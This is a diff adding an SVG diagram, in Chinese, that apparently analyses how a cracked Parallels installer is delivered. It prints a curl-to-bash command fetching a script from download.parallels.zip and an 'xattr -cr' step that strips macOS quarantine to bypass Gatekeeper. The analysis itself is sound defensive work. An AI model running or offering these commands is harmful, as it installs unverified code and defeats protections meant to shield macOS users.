@@ -1,0 +1,59 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 920 300" width="100%" role="img" aria-label="破解包投放链路">
+<style>
+  .t{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;fill:#24292f}
+  .mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;fill:#24292f}
+  .sub{fill:#6b7a8f}
+  .box{fill:none;stroke:#8b96a5;stroke-width:1.5;rx:8}
+  .bad{fill:none;stroke:#e5484d;stroke-width:2;rx:8}
+  .badfill{fill:#e5484d;opacity:.08}
+  .arw{stroke:#8b96a5;stroke-width:1.5;fill:none;marker-end:url(#a)}
+  .red{fill:#e5484d}
+  @media (prefers-color-scheme:dark){
+    .t,.mono{fill:#e6edf3}.sub{fill:#9aa7b5}
+    .box{stroke:#5b6673}.arw{stroke:#5b6673}
+  }
+</style>
+<defs><marker id="a" markerWidth="9" markerHeight="9" refX="8" refY="4.5" orient="auto">
+<path d="M0,0 L9,4.5 L0,9 z" fill="#8b96a5"/></marker></defs>
+
+<text x="0" y="18" class="t" font-size="15" font-weight="600">投放链路</text>
+
+<rect x="0" y="42" width="205" height="62" class="box"/>
+<text x="14" y="66" class="mono" font-size="11">curl -fsSL \</text>
+<text x="14" y="82" class="mono" font-size="11">download.parallels.zip\</text>
+<text x="14" y="96" class="mono" font-size="11">/install.sh | bash</text>
+
+<path d="M213,73 L253,73" class="arw"/>
+
+<rect x="261" y="42" width="150" height="62" class="box"/>
+<text x="275" y="66" class="t" font-size="12">三镜像测速</text>
+<text x="275" y="86" class="sub t" font-size="11">转圈动画 / 进度条</text>
+
+<path d="M419,73 L459,73" class="arw"/>
+
+<rect x="467" y="42" width="160" height="62" class="box"/>
+<text x="481" y="66" class="t" font-size="12">下载 Installer.zip</text>
+<text x="481" y="86" class="sub t" font-size="11">解压后删除原包</text>
+
+<path d="M635,73 L675,73" class="arw"/>
+
+<rect x="683" y="36" width="237" height="74" class="badfill" rx="8"/>
+<rect x="683" y="36" width="237" height="74" class="bad"/>
+<text x="697" y="60" class="mono red" font-size="12" font-weight="600">xattr -cr Installer.app</text>
+<text x="697" y="79" class="t" font-size="11">剥除 com.apple.quarantine</text>
+<text x="697" y="97" class="red" font-size="11" font-weight="600">→ 绕过 Gatekeeper</text>
+
+<path d="M801,118 L801,150" class="arw"/>
+
+<rect x="683" y="158" width="237" height="46" class="box"/>
+<text x="697" y="177" class="mono" font-size="11">open -a Installer.app</text>
+<text x="697" y="194" class="sub t" font-size="11">自动运行,不给检查窗口</text>
+
+<text x="0" y="150" class="t" font-size="13" font-weight="600">为什么需要这一步?</text>
+<text x="0" y="173" class="t" font-size="12">这个 app 是 adhoc 签名,没有 Developer ID、没有苹果公证。</text>
+<text x="0" y="193" class="t" font-size="12">带着隔离标记双击 → Gatekeeper 必然拦下。</text>
+<text x="0" y="220" class="red" font-size="12" font-weight="600">正规软件永远不需要剥自己的隔离属性。</text>
+<text x="0" y="240" class="t" font-size="12">写下这一行,等于承认「我过不了苹果的检查」。</text>
+
+<text x="0" y="278" class="sub t" font-size="11">注:实测该脚本对 curl 与浏览器 UA 返回内容一致,无差异化投放。</text>
+</svg>
